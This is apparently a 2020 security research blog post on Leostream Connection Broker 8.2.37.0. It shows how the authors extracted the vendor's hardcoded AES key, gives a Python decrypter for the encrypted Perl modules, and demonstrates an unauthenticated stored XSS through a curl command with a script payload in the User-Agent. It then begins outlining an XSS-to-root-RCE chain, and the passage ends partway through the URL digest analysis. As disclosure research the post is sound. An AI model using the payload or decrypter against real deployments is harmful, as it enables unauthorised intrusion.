<!DOCTYPE html> <html lang="en-US"> <head prefix="og: http://ogp.me/ns#"> <meta charset="UTF-8" /> <meta http-equiv="X-UA-Compatible" content="ie=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <meta name="mobile-web-app-capable" content="yes" /> <meta name="apple-mobile-web-app-capable" content="yes" /> <meta name="application-name" content="Adepts of 0xCC" /> <meta name="apple-mobile-web-app-status-bar-style" content="#fff" /> <meta name="apple-mobile-web-app-title" content="Adepts of 0xCC" /> <title> A brief encounter with Leostream Connect Broker - Adepts of 0xCC </title> <link rel="alternate" href="https://adepts.of0x.cc/Leostream-XSS-to-RCE/" hreflang="en-US" /> <link rel="canonical" href="https://adepts.of0x.cc/Leostream-XSS-to-RCE/" /> <meta name="description" content="Article about how to decrypt LeoStream Connect Broker files and exploiting a vulnerability to pop a shell as Root" /> <meta name="referrer" content="no-referrer-when-downgrade" /> <meta property="fb:app_id" content="" /> <meta property="og:site_name" content="A brief encounter with Leostream Connect Broker | " /> <meta property="og:title" content="A brief encounter with Leostream Connect Broker | " /> <meta property="og:type" content="website" /> <meta property="og:url" content="https://adepts.of0x.cc/Leostream-XSS-to-RCE/" /> <meta property="og:description" content="Article about how to decrypt LeoStream Connect Broker files and exploiting a vulnerability to pop a shell as Root" /> <meta property="og:image" content="https://adepts.of0x.cc/assets/img/ogp.png" /> <meta property="og:image:width" content="640" /> <meta property="og:image:height" content="640" /> <meta name="twitter:card" content="summary" /> <meta name="twitter:title" content="A brief encounter with Leostream Connect Broker | AdeptsOf0xCC" /> <meta name="twitter:url" content="https://adepts.of0x.cc/Leostream-XSS-to-RCE/" /> <meta name="twitter:site" content="@AdeptsOf0xCC" /> <meta name="twitter:creator" content="@AdeptsOf0xCC" /> <meta name="twitter:description" content="Article about how to decrypt LeoStream Connect Broker files and exploiting a vulnerability to pop a shell as Root" /> <meta name="twitter:image" content="https://adepts.of0x.cc/assets/img/ogp.png" /> <link type="application/atom+xml" rel="alternate" href="https://adepts.of0x.cc/feed.xml" title="Adepts of 0xCC" /> <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicons/apple-touch-icon.png" /> <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicons/favicon-32x32.png" /> <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicons/favicon-16x16.png" /> <link rel="manifest" href="/assets/favicons/site.webmanifest" /> <link rel="mask-icon" href="/assets/favicons/safari-pinned-tab.svg" color="#5bbad5" /> <meta name="apple-mobile-web-app-title" content="Jekyll Klise" /> <meta name="application-name" content="Jekyll Klise" /> <meta name="msapplication-TileColor" content="#da532c" /> <meta name="theme-color" content="#2c2c2c" /> <link rel="stylesheet" href="/assets/css/style.css" /> </head> <body data-theme="dark" class="notransition"> <script> const body = document.body; const data = body.getAttribute("data-theme"); const initTheme = (state) => { if (state === "dark") { body.setAttribute("data-theme", "dark"); } else if (state === "light") { body.removeAttribute("data-theme"); } else { localStorage.setItem("theme", data); } }; initTheme(localStorage.getItem("theme")); setTimeout(() => body.classList.remove("notransition"), 75); </script> <div class="navbar" role="navigation"> <nav class="menu"> <input type="checkbox" id="menu-trigger" class="menu-trigger" /> <label for="menu-trigger"> <span class="menu-icon"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <path d="M64,384H448V341.33H64Zm0-106.67H448V234.67H64ZM64,128v42.67H448V128Z" /> </svg> </span> </label> <a id="mode"> <svg class="mode-sunny" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>LIGHT</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> <svg class="mode-moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>DARK</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> </a> <div class="trigger"> <div class="trigger-container"><a class="menu-link" href="/">home</a><a class="menu-link" href="/archive/">archive</a><a class="menu-link" href="/about/">about</a><a class="menu-link rss" href="/feed.xml"> <svg xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 512 512" fill="#ED812E" > <title>RSS</title> <path d="M108.56,342.78a60.34,60.34,0,1,0,60.56,60.44A60.63,60.63,0,0,0,108.56,342.78Z" /> <path d="M48,186.67v86.55c52,0,101.94,15.39,138.67,52.11s52,86.56,52,138.67h86.66C325.33,312.44,199.67,186.67,48,186.67Z" /> <path d="M48,48v86.56c185.25,0,329.22,144.08,329.22,329.44H464C464,234.66,277.67,48,48,48Z" /> </svg> </a> </div> </div> </nav> </div> <div class="wrapper post"> <main class="page-content" aria-label="Content"> <article itemscope itemtype="https://schema.org/BlogPosting"> <header class="header"> <div class="tags"> <span itemprop="keywords"> <a class="tag" href="/tags/#vulnerabilities">VULNERABILITIES</a>, <a class="tag" href="/tags/#research">RESEARCH</a>, <a class="tag" href="/tags/#x-c3ll">X-C3LL</a> </span> </div> <h1 class="header-title" itemprop="headline">A brief encounter with Leostream Connect Broker</h1> <div class="post-meta"> <time datetime="2020-10-04T06:58:47+02:00" itemprop="datePublished"> Oct 04, 2020 </time> <span itemprop="author" itemscope itemtype="https://schema.org/Person"> <span itemprop="name">Adepts of 0xCC</span> </span> <time hidden datetime="2020-10-05T11:49:47+02:00" itemprop="dateModified"> Oct 04, 2020 </time> <span hidden itemprop="publisher" itemtype="Person">Adepts of 0xCC</span> <span hidden itemprop="image"></span> <span hidden itemprop="mainEntityOfPage"><p>Dear Fell<strong>owl</strong>ship, today’s homily is about a journey that begins with a few perl files encrypted by an ancient alchemy called <strong>source filter</strong>, and ends with a shell as root. Please, take a seat and listen to the story.</p> </span> </div> </header> <div class="page-content" itemprop="articleBody"> <p>Dear Fell<strong>owl</strong>ship, today’s homily is about a journey that begins with a few perl files encrypted by an ancient alchemy called <strong>source filter</strong>, and ends with a shell as root. Please, take a seat and listen to the story.</p> <h1 id="prayers-at-the-foot-of-the-altar-aka-disclaimer"> <a href="#prayers-at-the-foot-of-the-altar-aka-disclaimer" class="anchor-head"></a> Prayers at the foot of the Altar a.k.a. disclaimer </h1> <p><em>We reported the vulnerability to Leostream, but the tickets opened within their support platform were refused because we did not provide a customer license. We attempted to contact them again by email and twitter as well with no luck. In this post we talk about version 8.2.37.0, this vulnerability may or may not be present in more recent versions. After all our attempts, and being the support for 8.2 branch ended this September the 30th, we wrote this brief article.</em></p> <h1 id="introduction"> <a href="#introduction" class="anchor-head"></a> Introduction </h1> <p>Leostream is a platform used to manage the connections from users to VDI, cloud desktop, and similar stuff. It supports connections through SSH, VNC, Mechdyne TGX, etc. The platform is composed by 3 elements:</p> <ul> <li>Leostream Gateway</li> <li>Leostream Connection Broker</li> <li>Client Connector</li> </ul> <figure> <img src="/Leostream-xss-to-rce/LeostreamArchitecture-01-768x328.png" alt="Leostream architecture" /> <figcaption> Leostream Architecture </figcaption> </figure> <p>The Gateway component is usually internet-facing and it is in charge of managing the firewall rules to forward the traffic to the Connection Broker, so it is not a “mandatory” element. In practice, only the Connection Broker and the client are required to manage the configured VDIs. Connection Broker can be also integrated with Active Directory, Radius, VPNs, etc; so pwn one and jackpot! Leostream provides an old Connection Broker version as <a href="https://www.leostream.com/resource/legacy-downloads/">VM flavour</a>, so we can download it and ter it to pieces to check its guts.</p> <p>The VM comes with default user leo (and same password) so we can easily interact with the filesystem through SSH/SCP. The first thing that caught our attention was… Perl. The entire platform is build on top of Perl scripts. Great, so we can just <code class="language-plaintext highlighter-rouge">cat</code> and <code class="language-plaintext highlighter-rouge">grep</code> to find common vulnerability patterns within the scripts… except that we can’t. The files are encrypted. <strong>WTF?</strong></p> <h1 id="diving-in-perl-forums"> <a href="#diving-in-perl-forums" class="anchor-head"></a> Diving in Perl forums </h1> <p>The platform is composed by perl scripts (.pl) and perl modules (.pm), being the first just the entry points and the last where the code really lies. The problem is that the perl modules are encrypted, so what you see is:</p> <div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">use</span> <span class="nn">Filter::Crypto::</span><span class="nv">Decrypt</span><span class="p">;</span>
<span class="nv">b417e4be12f3cf2087102a195e8157cbc849a01c1c02b5e2aa53cbc5f787279661222b414e6cd792764042f3975023511</span>
<span class="mi">648</span><span class="nv">fd661af27c1754a739e4fbc68a9fd51236cd6cf7b1f28736fa629adeb67b0eec691cb8167b00458fba5ff0a7af95e5</span>
<span class="nv">ee071bfccb6c2a1b80c1861db313cd3af37135d3dc385b2c03979e13818536b48d28be12eb1dc93df1a3df5edec2efda8</span>
<span class="mi">7</span><span class="nv">a42d094544f751d57848731253e5cef981</span><span class="p">(</span><span class="o">..</span><span class="p">)</span>
</code></pre></div></div> <p>So we took our whip and hat from that Indiana Jones halloween costume and started to do a bit of archaeological google-fu, finding that encrypted sources in the perl world was a “common” practice in the old days. This encryption is made via <a href="https://perldoc.perl.org/perlfilter.html">“source filters”</a>, which are programs that can be executed between the file is read and it reaches the perl parser. The original encrypted file is read and saved in memory, then the source filters are called and the code is transformed (in our case decrypted) and finally arrives to the parser where it follows the normal flow as any other script.</p> <p>This “encryption” is futile as we have access to the files and to the whole VM with root privileges, so we can peek directly the memory to check what is going on. The web platform works on an Apache (httpd) with mod_perl, so the process must load at some point a shared object with the logic to decrypt the perl modules.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[leo@localhost tpc]$ sudo cat /proc/$(pidof httpd | cut -d" " -f1)/maps | grep -i filter
7fc86274f000-7fc862753000 r-xp 00000000 fd:00 263163                     /opt/lib/perl5/site_perl/5.10.1/auto/Filter/Crypto/Decrypt/Decrypt.so
7fc862753000-7fc862953000 ---p 00004000 fd:00 263163                     /opt/lib/perl5/site_perl/5.10.1/auto/Filter/Crypto/Decrypt/Decrypt.so
7fc862953000-7fc862954000 rw-p 00004000 fd:00 263163                     /opt/lib/perl5/site_perl/5.10.1/auto/Filter/Crypto/Decrypt/Decrypt.so
</code></pre></div></div> <p>Let’s download and try to figure out how it decrypts the files. Here we are going to explain how old versions of Leostream are encrypted (we are working with 8.2.37.0), but more recent releases use a different approach inside their Decrypt.so. First locate any imported perl function related to parsing:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x00001c20]&gt; ii~parser
78 0x00000000  GLOBAL  NOTYPE PL_parser
</code></pre></div></div> <p>Then find cross-references:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[0x00001c20]&gt; axF PL_parser
Finding references of flags matching 'PL_parser'...
[0x002046c8-0x00204750] sym.FilterCrypto_FilterDecrypt 0x25d6 [DATA] mov rbp, qword [rip + 0x201cab]
sym.FilterCrypto_FilterDecrypt 0x344f [DATA] mov r12, qword [rip + 0x200e32]
sym.FilterCrypto_FilterDecrypt 0x3450 [DATA] mov esp, dword [rip + 0x200e32]

</code></pre></div></div> <p>Ok, so that <code class="language-plaintext highlighter-rouge">FilterCrypto_FilterDecrypt</code> is our target function. When disassembled, it shows OpenSSL functions being called:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
0x00002ae7      488d3d121100.  lea rdi, obj.filter_crypto_pswd ; 0x3c00 ; "D\x9d*\u03abD\xc0AU\x99\x98\x02l*\x9aO\x853\x8f\x19|P\xeb\x96\x18\x97\xb5\xb6\xcc\xee\x0f\x1a"
|           0x00002aee      488b542458     mov rdx, qword [local_58h]  ; [0x58:8]=0 ; 'X'
|           0x00002af3      41b920000000   mov r9d, 0x20               ; "@"
|           0x00002af9      41b800080000   mov r8d, 0x800
|           0x00002aff      be20000000     mov esi, 0x20               ; "@"
|           0x00002b04      48890424       mov qword [rsp], rax
|           0x00002b08      e863efffff     call sym.imp.PKCS5_PBKDF2_HMAC_SHA1
...
|           0x00003304      e817e7ffff     call sym.imp.EVP_aes_256_cbc
...
</code></pre></div></div> <p>At this point we know that the files are encrypted with AES-256 in CBC mode and the key is derived using PBKDF2. Also we can observe that the derivation is done to a hardcoded value with the very descriptive name <strong>filter_crypto_paswd</strong>. So we only need to get the IV and the salt to start decrypting files. To grab that info we just uploaded a statically compiled gdbserver and debugged the httpd process. What we observed is: every perl module contains its own IV and salt inside the file:</p> <ul> <li>0-7 bytes =&gt; salt</li> <li>8-23 bytes =&gt; IV</li> <li>24-… =&gt; encrypted content</li> </ul> <p>We scripted a simple decrypter:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span>
<span class="c1"># Leostream source code decrypter by X-C3LL (Juan Manuel Fernandez)
</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="kn">import</span> <span class="nn">Crypto.Cipher.AES</span>
<span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">hexlify</span><span class="p">,</span> <span class="n">unhexlify</span>
<span class="kn">from</span> <span class="nn">backports.pbkdf2</span> <span class="kn">import</span> <span class="n">pbkdf2_hmac</span>

<span class="k">def</span> <span class="nf">unfilter</span><span class="p">(</span><span class="n">salt</span><span class="p">,</span> <span class="n">IV</span><span class="p">,</span> <span class="n">encrypted</span><span class="p">):</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">unhexlify</span><span class="p">(</span><span class="s">'449d2aceab44c041559998026c2a9a4f85338f197c50eb961897b5b6ccee0f1a'</span><span class="p">)</span> <span class="c1"># Hardcoded password
</span>    <span class="n">derived_key</span> <span class="o">=</span> <span class="n">pbkdf2_hmac</span><span class="p">(</span><span class="s">"sha1"</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">salt</span><span class="p">,</span> <span class="mh">0x800</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
    <span class="n">decipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">derived_key</span><span class="p">,</span><span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span><span class="n">IV</span><span class="p">)</span>
    <span class="n">plaintext</span> <span class="o">=</span> <span class="n">decipher</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">plaintext</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"python leostream-decrypter.py [SOURCE FILE]"</span><span class="p">)</span>
        <span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
            <span class="n">raw</span> <span class="o">=</span> <span class="nb">file</span><span class="p">.</span><span class="n">read</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"[!] Error: file could not be opened!"</span><span class="p">)</span>
        <span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">decrypted</span> <span class="o">=</span> <span class="n">unfilter</span><span class="p">(</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">raw</span><span class="p">[:</span><span class="mi">16</span><span class="p">]),</span> <span class="n">unhexlify</span><span class="p">(</span><span class="n">raw</span><span class="p">[</span><span class="mi">16</span><span class="p">:</span><span class="mi">48</span><span class="p">]),</span> <span class="n">unhexlify</span><span class="p">(</span><span class="n">raw</span><span class="p">[</span><span class="mi">48</span><span class="p">:]))</span>
    <span class="k">print</span><span class="p">(</span><span class="n">decrypted</span><span class="p">)</span>
</code></pre></div></div> <p>And now we can start reading source files <strong>:)</strong>:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ᐓ    for a in *.pm; do python ../leostream-decrypter.py $a &gt; $a.clean; mv $a.clean $a;done
ᐓ    head -n 6 Index.pm                             
package Index;
use strict;
use AuthCAS;
use CGI::Cookie;
use Crypt::CBC;
use Crypt::Blowfish;
close failed in file object destructor:
sys.excepthook is missing
lost sys.stderr
</code></pre></div></div> <h1 id="finding-a-stored-xss-"> <a href="#finding-a-stored-xss-" class="anchor-head"></a> Finding a stored XSS :( </h1> <p>With the source code decrypted, understanding how it works internally becomes an easy task. After reading a few files we can observe a common pattern: some (user controlled) data is saved to the database just escaping single quotes to avoid SQL injections, and then this content is showed at other point of the web platform in raw. For example, in WebQuery.pm:</p> <div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">sub </span><span class="nf">login</span> <span class="p">{</span>
    <span class="k">my</span> <span class="nv">$self</span> <span class="o">=</span> <span class="nb">shift</span><span class="p">;</span>
    <span class="k">my</span> <span class="nv">$cg</span> <span class="o">=</span> <span class="nv">Session</span><span class="o">-&gt;</span><span class="nv">cg</span><span class="p">;</span>
    <span class="k">my</span> <span class="nv">$fl</span> <span class="o">=</span> <span class="nv">Session</span><span class="o">-&gt;</span><span class="nv">fl</span><span class="p">;</span>
    <span class="k">my</span> <span class="nv">$tm</span> <span class="o">=</span> <span class="nv">Session</span><span class="o">-&gt;</span><span class="nv">tm</span><span class="p">;</span>

    <span class="nv">$fl</span><span class="o">-&gt;</span><span class="nv">set_tmp</span><span class="p">('</span><span class="s1">using_browser</span><span class="p">',</span> <span class="mi">1</span><span class="p">);</span> <span class="c1"># Pretend we are a browser</span>
    <span class="nv">$fl</span><span class="o">-&gt;</span><span class="nv">set_tmp</span><span class="p">('</span><span class="s1">switched_view</span><span class="p">',</span> <span class="mi">1</span><span class="p">);</span> <span class="c1"># and pretend we switched to administrator view</span>

    <span class="k">my</span> <span class="nv">$h</span> <span class="o">=</span> <span class="nn">libMisc::</span><span class="nv">browser_client</span><span class="p">();</span>
    <span class="nv">$h</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">name</span><span class="p">}</span> <span class="o">=</span> <span class="p">'</span><span class="s1">Web Query</span><span class="p">';</span>
    <span class="nv">$h</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">client_type</span><span class="p">}</span> <span class="o">=</span> <span class="p">'</span><span class="s1">web query</span><span class="p">';</span>
    <span class="nv">$h</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">device</span><span class="p">}</span> <span class="o">=</span> <span class="p">'</span><span class="s1">application</span><span class="p">';</span>
    <span class="k">my</span> <span class="nv">$client_id</span> <span class="o">=</span> <span class="nv">Client</span><span class="o">-&gt;</span><span class="nv">find_client</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$client_id</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1"># These fields have defaults which shouldn't be overwritten in existing clients</span>
        <span class="nb">delete</span> <span class="nv">$h</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">client_assignment_mode</span><span class="p">};</span>
        <span class="nb">delete</span> <span class="nv">$h</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">display_layout_assignment_mode</span><span class="p">};</span>
        <span class="nv">Client</span><span class="o">-&gt;</span><span class="k">new</span><span class="p">(</span><span class="o">-</span><span class="s">id</span><span class="o">=&gt;</span><span class="nv">$client_id</span><span class="p">)</span><span class="o">-&gt;</span><span class="nv">save_data</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">my</span> <span class="nv">$client</span> <span class="o">=</span> <span class="nv">Client</span><span class="o">-&gt;</span><span class="k">new</span><span class="p">(</span><span class="o">-</span><span class="k">new</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">);</span>
        <span class="nv">$client</span><span class="o">-&gt;</span><span class="nv">save_data</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>
        <span class="nv">$client_id</span> <span class="o">=</span> <span class="nv">$client</span><span class="o">-&gt;</span><span class="nv">id</span><span class="p">;</span>
    <span class="p">}</span>
<span class="o">...</span>
</code></pre></div></div> <p>In this code snippet we can see how the application calls <code class="language-plaintext highlighter-rouge">libMisc::browser_client()</code>, sets some fields, and then searches the “client”. If it is new, then the data is saved to the database. Let’s check <code class="language-plaintext highlighter-rouge">browser_client()</code> from <code class="language-plaintext highlighter-rouge">libMisc.pm</code>:</p> <div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Return a Client-formatted recordset about the current browser</span>
<span class="k">sub </span><span class="nf">browser_client</span> <span class="p">{</span>
    <span class="k">my</span> <span class="nv">$cg</span> <span class="o">=</span> <span class="nv">Session</span><span class="o">-&gt;</span><span class="nv">cg</span><span class="p">;</span>
    <span class="k">my</span> <span class="nv">$ua</span> <span class="o">=</span> <span class="nv">$cg</span><span class="o">-&gt;</span><span class="nv">user_agent</span><span class="p">();</span>
    <span class="k">my</span> <span class="nv">$make</span> <span class="o">=</span> <span class="nv">parse_user_agent</span><span class="p">(</span><span class="nv">$ua</span><span class="p">);</span>
    <span class="k">my</span> <span class="nv">$h</span> <span class="o">=</span> <span class="nv">Client</span><span class="o">-&gt;</span><span class="k">new</span><span class="p">(</span><span class="o">-</span><span class="k">new</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">)</span><span class="o">-&gt;</span><span class="nv">data</span><span class="p">;</span>
    <span class="nv">$h</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">name</span><span class="p">}</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$make</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">255</span><span class="p">);</span>
    <span class="nv">$h</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">client_type</span><span class="p">}</span> <span class="o">=</span> <span class="p">'</span><span class="s1">browser</span><span class="p">';</span>
    <span class="nv">$h</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">manufacturer</span><span class="p">}</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$ua</span> <span class="o">=~</span> <span class="sr">/\b(?:MSIE|Trident|Edge)\b/</span> <span class="p">?</span> <span class="p">'</span><span class="s1">Microsoft</span><span class="p">'</span> <span class="p">:</span> <span class="p">'</span><span class="s1">Other</span><span class="p">');</span>
    <span class="nv">$h</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">device</span><span class="p">}</span> <span class="o">=</span> <span class="p">'</span><span class="s1">Web browser</span><span class="p">';</span>
    <span class="nv">$h</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">device_version</span><span class="p">}</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$ua</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">4095</span><span class="p">);</span>
    <span class="nv">$h</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">client_language</span><span class="p">}</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$ENV</span><span class="p">{</span><span class="nv">HTTP_ACCEPT_LANGUAGE</span><span class="p">},</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>
    <span class="nv">$h</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">client_token</span><span class="p">}</span> <span class="o">=</span> <span class="p">'';</span>
    <span class="nv">$h</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">display_count</span><span class="p">}</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="nv">$h</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">location</span><span class="p">}</span> <span class="o">=</span> <span class="p">'';</span>
    <span class="nv">$h</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">ip</span><span class="p">}</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$ENV</span><span class="p">{</span><span class="nv">REMOTE_ADDR</span><span class="p">},</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">20</span><span class="p">);</span>
    <span class="nv">$h</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">http_header</span><span class="p">}</span> <span class="o">=</span> <span class="nv">http_header_string</span><span class="p">();</span>

    <span class="c1"># FIXME: for language, return as pretty string.  For example, parse:</span>
    <span class="c1"># for i in /usr/share/i18n/locales/*; do echo $i; perl -ne '(/^language/ || /^territory/) &amp;&amp; print' $i; echo ""; done</span>
    <span class="k">return</span> <span class="nv">$h</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p>It takes a lot of user-controlled fields that, in the end, are going to be saved to the database as we saw before. The strings are not escaped before they are stored in the database, and also they are not escaped when they are rendered in the web, so we have a stored XSS.</p> <p>But… this information is stored before the login credentials are checked, <strong>so we can inject our payload without authentication :)</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://remote-target/webquery.pl\?action\=run\&amp;method\=qselect\&amp;user\=AdeptsOf0xCC\&amp;password\=RKL -H "User-Agent: &lt;script&gt;alert(/pwned/)&lt;/script&gt;"
</code></pre></div></div> <p>As stated before, this same code pattern can be spoted in other files.</p> <h1 id="turning-the-lousy-xss-into-an-rce-as-root-"> <a href="#turning-the-lousy-xss-into-an-rce-as-root-" class="anchor-head"></a> Turning the lousy XSS into an RCE as root :) </h1> <p>The recipe to turn an XSS into an RCE in any web platform is usually the same:</p> <ul> <li>4oz plugin uploader</li> <li>A few drops of injected JavaScript</li> </ul> <p>But this time our XSS-to-RCE-cupcake has a twist: internal URLs are protected by a digest to avoid anti-tampering, so we can not just upload our webshell directly with a request. Let’s dig a bit into this.</p> <p>Leostream protects the URLs from tampering adding a parameter, <code class="language-plaintext highlighter-rouge">r</code>, with a digest value that is generated via <code class="language-plaintext highlighter-rouge">digest_of_url</code> from <code class="language-plaintext highlighter-rouge">libMisc.pm</code>:</p> <div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">...</span>
<span class="k">my</span> <span class="nv">$digest</span> <span class="o">=</span> <span class="nv">md5_base64</span><span class="p">((</span><span class="nb">join</span> <span class="p">'</span><span class="s1">!</span><span class="p">',</span>
                             <span class="nb">grep</span> <span class="p">{</span><span class="sr">/^(mb_|action|r|[^=]*[u_]id)/</span><span class="p">}</span>
                             <span class="nb">split</span> <span class="sr">/[;&amp;]/</span><span class="p">,</span> <span class="nv">$url</span><span class="p">)</span>
                            <span class="o">.</span> <span class="nv">$digest_secret</span><span class="p">);</span>

    <span class="c1"># Take only the first 7 url-safe characters.  (In tests with an unchanging r value,</span>
    <span class="c1"># this algorithm produced only 2 duplicate keys in 3,000,000 uid/thing_id combinations.)</span>
    <span class="nv">$digest</span> <span class="o">=~</span> <span class="sr">s/[^a-zA-Z0-9_.-]//g</span><span class="p">;</span>
    <span class="nv">$digest</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$digest</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="p">);</span>

    <span class="k">return</span> <span class="nv">$digest</span><span class="p">;</span>
